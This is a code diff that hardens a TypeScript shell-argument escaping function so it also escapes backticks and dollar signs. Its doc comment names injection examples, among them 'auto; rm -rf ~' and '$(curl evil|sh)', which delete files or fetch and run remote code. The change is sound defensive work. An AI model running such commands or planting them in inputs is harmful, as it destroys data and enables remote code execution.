@@ -119,13 +119,20 @@ export const appendRalphWorktreeShellFlags = (
 /**
  * @description Escapes an arbitrary value for safe use as a single argument inside a
  * `shell: true` command string. Values matching the safe charset are passed through
- * verbatim; anything else is wrapped in double quotes with `\` and `"` escaped, so a
- * value like `auto; rm -rf ~` or `$(curl evil|sh)` cannot break out of the argument.
+ * verbatim; anything else is wrapped in double quotes with every shell-special
+ * character (`\`, `` ` ``, `$`, `"`) escaped, so a value like `auto; rm -rf ~`,
+ * `$(curl evil|sh)`, `` `id` ``, or `${HOME}` cannot break out of the argument or
+ * trigger command/parameter substitution. The backslash replacement runs first so the
+ * escapes it adds are not double-escaped by the later passes.
  */
 export const escapeShellArg = (value: string): string => {
   if (/^[A-Za-z0-9._/-]+$/.test(value)) {
     return value;
   }
 
-  return `"${value.replace(/\\/g, '\\\\').replace(/"/g, '\\"')}"`;
+  return `"${value
+    .replace(/\\/g, '\\\\')
+    .replace(/`/g, '\\`')
+    .replace(/\$/g, '\\$')
+    .replace(/"/g, '\\"')}"`;
 };
